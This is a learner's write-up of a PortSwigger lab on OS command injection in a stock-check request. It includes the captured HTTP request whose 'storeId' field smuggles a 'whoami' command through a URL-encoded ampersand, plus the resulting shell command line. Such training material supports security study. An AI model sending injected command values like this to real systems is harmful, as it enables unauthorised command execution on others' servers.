# [OS command injection, simple case] — [PortSwigger] — [Apprentice]
**Date:** 2026-06-16
 
---
 
## Vulnerability / core concept
OS Command Injection

## What made me stuck
This level was pretty easy and straightforward. I solved it quite easily.
 
## What unblocked me
`null`
 
---


## Attack path
1) During inspection using web proxy like Caido, we notice that web application sends `/product/stock` request to retrieve the stock amount of the product.
2) We can modify this request and send URL encoded malicious payload to execute arbitrary OS command and solve this lab.

---


## Payload / key command
```bash
POST /product/stock HTTP/1.1
Host: 0a1b008203560e4f8210ecf000b70014.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0a1b008203560e4f8210ecf000b70014.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: https://0a1b008203560e4f8210ecf000b70014.web-security-academy.net
Connection: keep-alive
Cookie: session=2S7k2nX6fJijE5Ch2TO7MHpTvzmnfNua
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

productId=1&storeId=1%26whoami%26
```
As you can see, we modified `storeId` to be `1&whoami` and then URL encoded it to send a `storeId` value. This API executes `stockreport.sh` with two parameters: `productId` and `stockId`. This payload the whole command look like this:
```bash
stockreport.sh 1 1&whoami
```
Basically, after executing `stockreport.sh`, system executes `whoami` command and retrieves us the current user.

---


## What I'd recognize faster next time
It is important to check OS command injection because web application might use legacy systems where API calls are sent to system and executed as shell script. This vulnerability is rare, however, when it happens, it has very critical threat to the system.


